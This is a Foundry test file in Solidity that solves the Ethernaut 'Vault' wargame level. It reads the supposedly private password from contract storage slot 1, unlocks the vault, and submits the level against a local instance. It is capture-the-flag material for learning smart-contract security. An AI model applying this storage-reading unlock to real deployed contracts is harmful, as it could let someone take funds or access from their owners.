// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Ethernaut.sol";
import "src/08-Vault/VaultFactory.sol";

contract BaseSetUp is Test {
    Ethernaut ethernaut;
    address payable attacker;

    function setUp() public virtual {
        // Initialize Ethernaut contract
        ethernaut = new Ethernaut();

        // Initialize Attacker EOA
        attacker = payable(vm.addr(1));      
        vm.deal(attacker, 10 ether);
        vm.label(attacker, "Attacker");
    }
}

contract Attack is BaseSetUp {
    using stdStorage for StdStorage;

    Vault ethernautVault;
    address payable levelAddress;

    function setUp() public virtual override {
        BaseSetUp.setUp();

        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);

        vm.prank(attacker);
        levelAddress = payable(ethernaut.createLevelInstance(vaultFactory));
        ethernautVault = Vault(levelAddress);
        console.log("Ethernaut Vault Challenge!");
    }

    function testAttack() public {

        // Stole the password by reading the contract storage (slot 1)
        bytes32 stolenPassword = vm.load(address(ethernautVault), bytes32(uint(1)));

        emit log_named_bytes32("stolenPassword", stolenPassword);

        vm.prank(attacker);
        ethernautVault.unlock(stolenPassword);

        assert(!ethernautVault.locked());

        // Submit Level
        vm.prank(attacker);
        bool passedLevel = ethernaut.submitLevelInstance(levelAddress);
        assert(passedLevel);
    }
}